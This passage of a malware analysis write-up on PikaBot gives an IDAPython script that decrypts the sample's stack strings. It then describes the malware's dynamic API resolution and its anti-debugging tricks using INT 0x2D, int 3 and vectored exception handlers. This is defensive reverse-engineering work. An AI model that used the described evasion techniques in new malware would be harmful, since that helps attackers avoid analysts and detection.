</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint</span><span class="p">(</span><span class="n">op_offset</span><span class="p">)</span><span class="o">.</span><span class="n">value</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_second_operand_short</span><span class="p">(</span><span class="n">ea</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">op_offset</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_ushort</span><span class="p">(</span><span class="n">op_offset</span><span class="p">)</span><span class="o">.</span><span class="n">value</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_bitwise_op</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">block_start_ea</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">idc</span><span class="o">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&#34;xor&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="n">idc</span><span class="o">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&#34;add&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="n">idc</span><span class="o">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&#34;and&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="n">idc</span><span class="o">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&#34;sub&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="ow">and</span> <span class="n">ea</span> <span class="o">&gt;</span> <span class="n">block_start_ea</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">ea</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ea</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bitwise_and_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result_int</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span> <span class="o">&amp;</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result_int</span> <span class="o">=</span> <span class="n">result_int</span> <span class="o">&amp;</span> <span class="mh">0x00FF</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result_int</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bitwise_sub_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result_int</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span> <span class="o">-</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result_int</span> <span class="o">=</span> <span class="n">result_int</span> <span class="o">&amp;</span> <span class="mh">0x00FF</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(result_int)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result_int</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bitwise_add_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result_int</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result_int</span> <span class="o">=</span> <span class="n">result_int</span> <span class="o">&amp;</span> <span class="mh">0x00FF</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result_int</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bitwise_xor_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result_int</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span> <span class="o">^</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result_int</span> <span class="o">=</span> <span class="n">result_int</span> <span class="o">&amp;</span> <span class="mh">0x00FF</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result_int</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">set_comment</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">text</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">idc</span><span class="o">.</span><span class="n">set_cmt</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_valid_cmp</span><span class="p">(</span><span class="n">ea</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">idc</span><span class="o">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;cmp&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_fn</span><span class="p">(</span><span class="n">fn</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="n">func</span> <span class="o">=</span> <span class="n">ida_funcs</span><span class="o">.</span><span class="n">get_func</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>  <span class="c1"># get function pointer</span>
</span></span><span class="line"><span class="cl">    <span class="n">func_fc</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">idaapi</span><span class="o">.</span><span class="n">FlowChart</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">idaapi</span><span class="o">.</span><span class="n">FC_PREDS</span><span class="p">))</span>  <span class="c1"># get function flowchart object (list of blocks)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">block_index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">func_fc</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">block</span> <span class="o">=</span> <span class="n">func_fc</span><span class="p">[</span><span class="n">block_index</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">last_inst</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">end_ea</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">idc</span><span class="o">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">last_inst</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;jl&#34;</span> <span class="ow">and</span> <span class="n">is_valid_cmp</span><span class="p">(</span><span class="n">idc</span><span class="o">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">last_inst</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="n">stack_end_ea</span> <span class="o">=</span> <span class="n">block</span><span class="o">.</span><span class="n">end_ea</span>
</span></span><span class="line"><span class="cl">            <span class="n">prev_block</span> <span class="o">=</span> <span class="n">func_fc</span><span class="p">[</span><span class="n">block_index</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">stack_start_ea</span> <span class="o">=</span> <span class="n">prev_block</span><span class="o">.</span><span class="n">start_ea</span>
</span></span><span class="line"><span class="cl">            <span class="n">first_BB_end</span> <span class="o">=</span> <span class="n">prev_block</span><span class="o">.</span><span class="n">end_ea</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># get stack offset</span>
</span></span><span class="line"><span class="cl">            <span class="n">inst_ptr</span> <span class="o">=</span> <span class="n">last_inst</span>
</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="n">inst_ptr</span> <span class="o">&gt;=</span> <span class="n">block</span><span class="o">.</span><span class="n">start_ea</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">inst_ptr</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">inst_ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">idc</span><span class="o">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">inst_ptr</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;mov&#34;</span> <span class="ow">and</span> <span class="n">get_second_operand</span><span class="p">(</span><span class="n">idc</span><span class="o">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">inst_ptr</span><span class="p">))</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                        <span class="p">{</span>
</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;start&#34;</span><span class="p">:</span> <span class="n">stack_start_ea</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;end&#34;</span><span class="p">:</span> <span class="n">stack_end_ea</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;first_BB_end&#34;</span><span class="p">:</span> <span class="n">first_BB_end</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;bitwise_op&#34;</span><span class="p">:</span> <span class="n">get_bitwise_op</span><span class="p">(</span><span class="n">inst_ptr</span><span class="p">,</span> <span class="n">block</span><span class="o">.</span><span class="n">start_ea</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="cl">                    <span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># get the addresses of stack strings</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_all_strings</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">stack_strings</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">idautils</span><span class="o">.</span><span class="n">Functions</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span> <span class="o">=</span> <span class="n">parse_fn</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">stack_strings</span> <span class="o">+=</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">stack_strings</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decode_strings</span><span class="p">(</span><span class="n">stack_strings</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">strings</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ss</span> <span class="ow">in</span> <span class="n">stack_strings</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">out</span> <span class="o">=</span> <span class="n">emulate</span><span class="p">(</span><span class="n">ss</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;start&#34;</span><span class="p">),</span> <span class="n">ss</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;end&#34;</span><span class="p">),</span> <span class="n">ss</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;first_BB_end&#34;</span><span class="p">),</span> <span class="n">ss</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;bitwise_op&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">ss</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;start&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">out</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">strings</span><span class="p">[</span><span class="n">ss</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;start&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="n">out</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Failed decoding: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">ss</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;start&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">strings</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ss_decrypt</span><span class="p">(</span><span class="n">operation</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">byte_str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">byte_str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">operation</span> <span class="o">==</span> <span class="s2">&#34;xor&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">output</span> <span class="o">+=</span> <span class="n">bitwise_xor_bytes</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">operation</span> <span class="o">==</span> <span class="s2">&#34;add&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">output</span> <span class="o">+=</span> <span class="n">bitwise_add_bytes</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">operation</span> <span class="o">==</span> <span class="s2">&#34;and&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">output</span> <span class="o">+=</span> <span class="n">bitwise_and_bytes</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">operation</span> <span class="o">==</span> <span class="s2">&#34;sub&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">output</span> <span class="o">+=</span> <span class="n">bitwise_sub_bytes</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">output</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_byte_string</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">str_len</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">byte_str</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">inst_ptr</span> <span class="o">=</span> <span class="n">end</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">inst_ptr</span> <span class="o">&gt;=</span> <span class="n">start</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">inst_ptr</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">inst_ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">idc</span><span class="o">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">inst_ptr</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;mov&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_operand_type</span><span class="p">(</span><span class="n">inst_ptr</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dtype_val</span> <span class="o">=</span> <span class="n">idautils</span><span class="o">.</span><span class="n">DecodeInstruction</span><span class="p">(</span><span class="n">inst_ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">ida_ua</span><span class="o">.</span><span class="n">get_dtype_size</span><span class="p">(</span><span class="n">dtype_val</span><span class="o">.</span><span class="n">Op1</span><span class="o">.</span><span class="n">dtype</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">temp</span> <span class="o">=</span> <span class="n">get_second_operand_short</span><span class="p">(</span><span class="n">inst_ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">temp</span> <span class="o">=</span> <span class="n">get_second_operand</span><span class="p">(</span><span class="n">inst_ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">temp</span> <span class="o">=</span> <span class="n">temp</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># print(f&#34;str: {temp}&#34;)</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># insert at the beginning of the string.</span>
</span></span><span class="line"><span class="cl">                <span class="n">temp_list</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">byte_str_list</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">byte_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">temp_list</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">byte_str_list</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">byte_str</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">temp_list</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">byte_str</span> <span class="o">=</span> <span class="n">byte_str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">x00&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;byte_str: </span><span class="si">{</span><span class="n">byte_str</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">byte_str</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">emulate</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">first_BB_end</span><span class="p">,</span> <span class="n">bitwise_op_addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">last_inst</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">end</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">operation</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">bitwise_op_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">get_second_operand</span><span class="p">(</span><span class="n">bitwise_op_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;address:</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">bitwise_op_addr</span><span class="p">)</span><span class="si">}</span><span class="s2"> key: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">str_len</span> <span class="o">=</span> <span class="n">get_second_operand</span><span class="p">(</span><span class="n">idc</span><span class="o">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">last_inst</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">byte_str</span> <span class="o">=</span> <span class="n">get_byte_string</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">first_BB_end</span><span class="p">,</span> <span class="n">str_len</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="o">=</span> <span class="n">ss_decrypt</span><span class="p">(</span><span class="n">operation</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">byte_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">stack_strings</span> <span class="o">=</span> <span class="n">get_all_strings</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">strings</span> <span class="o">=</span> <span class="n">decode_strings</span><span class="p">(</span><span class="n">stack_strings</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="n">strings</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">      <span class="n">set_comment</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Result:</strong>
Works well for most of the strings. But it fails at two cases where the strings not in the pattern explained previously or it uses <code>SIMD</code> instructions like <code>psubb</code>. We can decode them with the first script.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%208.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%208.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%208.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%208.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%208.png"
        title="Untitled" width="576" height="387" /></p>
<h3 id="dynamic-api-resolving">Dynamic API resolving</h3>
<p>the malware uses <code>LoadLibraryA</code> and <code>GetProcAddress</code> to get the function Address. They choses the appropriate DLL by passing a flag in the first Argument.</p>
<table>
<thead>
<tr>
<th>flag</th>
<th>DLL</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Kernel32.dll</td>
</tr>
<tr>
<td>2</td>
<td>User32.dll</td>
</tr>
<tr>
<td>3</td>
<td>ntdll.dll</td>
</tr>
</tbody>
</table>
<h3 id="anti-analysis">Anti Analysis</h3>
<p>The malware uses a series of anti-debugging checks before continuing, the checks used:</p>
<ol>
<li>Test Exception EXCEPTION_BREAKPOINT (0x80000003) using the resolved <code>AddVectoredExceptionHandler</code> followed by a function to trigger the <code>EXCEPTION_BREAKPOINT</code> exception using <code>INT 0x2D</code>. Then it removes the handler using <code>RemoveVectoredExceptionHandler</code>. In a subsequent call, it uses <code>int 3</code> instead of <code>int 0x2D</code>.</li>
</ol>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%209.png"
